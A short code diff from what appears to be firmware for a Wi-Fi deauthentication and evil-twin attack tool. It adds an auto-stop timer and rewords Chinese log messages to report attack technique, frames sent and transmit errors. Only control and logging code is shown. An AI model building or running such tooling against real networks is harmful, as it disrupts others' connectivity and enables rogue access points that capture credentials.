+  if (sDeauth.running && sDeauth.stopAt && (int32_t)(now - sDeauth.stopAt) >= 0) {
+    log("[attack] 攻击持续时间已到 (" + String(sDeauth.durationMs / 1000) + "s), 自动停止");
+    if (sEvilTwin.active) eviltwinStopAttack(true);
+    else stopDeauthEngine();
+  }
   if (sDeauth.running && now - sDeauth.lastLogTime >= 5000) {
     sDeauth.lastLogTime = now;
-    log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
+    log("[deauth] 攻击进行中 (" + String(atkTechName(sDeauth.techCursor)) + "), 已成功发送 " +
+        String(sDeauth.frameCount) + " 帧" +
         (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
-        (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
+        (sDeauth.txOk ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
   }
 
   // 诊断: 伪造信标广播 (第三方网卡可扫描验证帧是否到达空口)
